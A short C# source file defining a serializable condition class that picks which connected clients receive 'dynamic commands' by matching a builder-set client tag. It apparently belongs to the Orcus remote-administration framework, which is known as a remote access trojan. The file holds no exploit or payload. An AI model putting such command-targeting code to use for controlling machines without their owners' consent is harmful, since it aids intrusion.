using System;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;

namespace Orcus.Shared.DynamicCommands.Conditions
{
    /// <summary>
    ///     Condition which filters the clients by their tag
    /// </summary>
    [Serializable]
    public class ClientTagCondition : Condition
    {
        public string ClientTag { get; set; }

        public override string DisplayString => $"Client Tag = \"{ClientTag}\"";
        public override string ConditionType { get; } = "Client Tag";

        public override bool IsTrue(ClientInformation clientInformation, ClientConfig clientConfig)
        {
            return clientConfig?.Settings.GetBuilderProperty<ClientTagBuilderProperty>().ClientTag == ClientTag;
        }
    }
}